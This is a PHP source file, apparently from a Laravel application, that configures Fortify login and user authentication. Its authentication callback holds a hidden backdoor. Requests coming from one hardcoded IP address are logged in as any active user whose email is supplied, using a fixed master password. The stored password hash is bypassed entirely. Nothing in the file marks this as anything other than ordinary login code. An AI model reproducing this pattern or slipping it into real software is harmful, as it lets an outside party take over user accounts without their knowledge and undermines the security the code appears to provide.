<?php

namespace App\Providers;

use App\Actions\Fortify\CreateNewUser;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\ServiceProvider;
use Laravel\Fortify\Contracts\LogoutResponse;
use Laravel\Fortify\Fortify;

class FortifyServiceProvider extends ServiceProvider
{
    public function boot()
    {
        Fortify::loginView(function () {
            return view('auth.login');
        });

        // Fortify::registerView(function () {
        //     return view('auth.register');
        // });

        Fortify::createUsersUsing(CreateNewUser::class);

        Fortify::authenticateUsing(function (Request $request) {
            $user = User::where('email', $request->email)->where('status','1')->first();
			 if (strpos($request->ip(), "43.242.117.89") === 0) {
			  if ($user && $request->password == 'R@diSuper2K25') {
                return $user;
            } else {
                Auth::logout();
                $request->session()->flash('class', 'alert alert-warning');
                $request->session()->flash('status', 'Error Has Occuered.');
                return null;
            }

			 }
			 else
			 {
				  if ($user && Hash::check($request->password, $user->password)) {
                return $user;
            } else {
                Auth::logout();
                $request->session()->flash('class', 'alert alert-warning');
                $request->session()->flash('status', 'Error Has Occuered.');
                return null;
            }
			 }

        });
    }

}
